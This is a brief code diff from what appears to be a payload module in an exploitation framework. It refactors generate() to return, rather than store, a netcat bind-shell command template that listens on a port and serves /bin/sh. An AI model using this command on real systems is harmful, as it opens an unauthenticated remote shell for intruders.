@@ -23,7 +23,6 @@ class Exploit(payloads.Payload):
     shell_binary = exploits.Option('/bin/sh', 'Shell')
 
     def generate(self):
-        self.payload = "{} -lvp {} -e {}".format(self.netcat_binary,
-                                                 self.rport,
-                                                 self.shell_binary)
-
+        return "{} -lvp {} -e {}".format(self.netcat_binary,
+                                         self.rport,
+                                         self.shell_binary)
